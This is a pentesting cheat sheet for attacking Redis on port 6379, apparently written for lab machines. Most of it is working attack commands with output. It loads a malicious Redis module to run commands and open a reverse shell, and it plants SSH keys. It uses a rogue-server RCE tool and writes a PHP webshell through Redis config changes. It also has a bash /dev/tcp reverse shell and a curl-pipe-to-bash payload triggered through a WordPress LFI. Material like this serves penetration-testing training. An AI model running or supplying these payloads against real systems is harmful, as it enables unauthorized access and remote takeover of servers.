# (6379) Redis

<details>

<summary>Plaintext Password file Location</summary>

```bash
/etc/redis/redis.conf
```

</details>

<details>

<summary>Redis Module Rev Shell</summary>

[https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#load-redis-module](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#load-redis-module)

### Creating module.so

```bash
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git 
cd RedisModules-ExecuteCommand 
make 
```

### Loading module.so to Victim

```bash
ftp 192.168.160.93
cd pub
bin
put module.so
```

### Redis Server Module Rev Shell

* FTP default directory root: `/var/ftp`

```bash
redis-cli -h 192.168.160.93
module load /var/ftp/pub/module.so
module list
# 1) "name"
# 2) "system"
# 3) "ver"
# 4) (integer) 1
system.exec "whoami"
# "pablo\n"

# Rev Shell
system.rev 192.168.45.5 80

# OR SSH authorized login
system.exec "mkdir /home/pablo/.ssh"
system.exec 'echo "<id_rsa.pub>" > /home/pablo/.ssh/authorized_keys'
```

</details>

<details>

<summary>Redis RCE &#x3C;= 5.0.5</summary>

[https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)

```bash
python3 redis-rogue-server.py --rhost 192.168.160.166 --lhost 192.168.45.5 --passwd="Ready4Redis?" 
```

* Can try changing the lport if firewall blocking

</details>

<details>

<summary>Webshell using Redis</summary>

```bash
config set dir /var/www/html
config set dbfilename test.php
set test "<?php system('id'); ?>"
save
```

### Alternative if facing "(error) ERR"

#### On Redis:

```bash
config set dir /opt/redis-files
config set dbfilename test.php
set test "<?php system('id'); ?>"
save
```

#### On Kali:

<pre class="language-bash"><code class="lang-bash">curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php -o test.php
<strong>
</strong><strong>strings test.php      
</strong>#REDIS0009
#        redis-ver
#5.0.14
#redis-bits
#ctime
#used-mem
#aof-preamble
#test
#uid=1000(alice) gid=1000(alice) groups=1000(alice)
# {"success":true,"data":{"output":[]}}
</code></pre>

</details>

<details>

<summary>RCE using Redis</summary>

#### Shell.sh

```bash
#!/bin/bash

/bin/bash -i >& /dev/tcp/192.168.118.14/9002 0>&1
```

#### On Victim:

```bash
config set dir /opt/redis-files
config set dbfilename test.php
set test "<?php system('curl 192.168.118.14/shell.sh | bash'); ?>"
```

Using LFI (for Wordpress):

```bash
curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php
```

```bash
connect to [192.168.118.14] from (UNKNOWN) [192.168.120.85] 45752
bash: cannot set terminal process group (551): Inappropriate ioctl for device
bash: no job control in this shell
<ite-editor/editor/extensions/pagebuilder/includes$ whoami
whoami
alice
```

</details>
